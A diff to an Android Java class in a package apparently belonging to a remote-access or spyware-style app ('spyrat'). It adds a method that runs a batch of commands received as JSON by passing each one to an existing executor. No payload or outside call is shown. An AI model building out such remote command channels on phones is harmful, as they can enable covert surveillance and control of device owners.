@@ -2,9 +2,27 @@ package com.spyrat.investigation;
 
 import android.content.Context;
 import android.util.Log;
+import org.json.JSONArray;
+import org.json.JSONObject;
 
 public class CommandExecutor {
     private static final String TAG = "SpyratCommandExec";
+
+    public static void executeCommands(JSONArray commands, Context context) {
+        Log.d(TAG, "🎯 Executing commands batch: " + commands.length());
+        
+        try {
+            for (int i = 0; i < commands.length(); i++) {
+                JSONObject commandObj = commands.getJSONObject(i);
+                String command = commandObj.getString("command");
+                String parameters = commandObj.optString("parameters", "");
+                
+                executeCommand(context, command, parameters);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Command batch execution error: " + e.getMessage());
+        }
+    }
 
     public static void executeCommand(Context context, String command, String parameters) {
         Log.d(TAG, "🎯 Executing command: " + command);
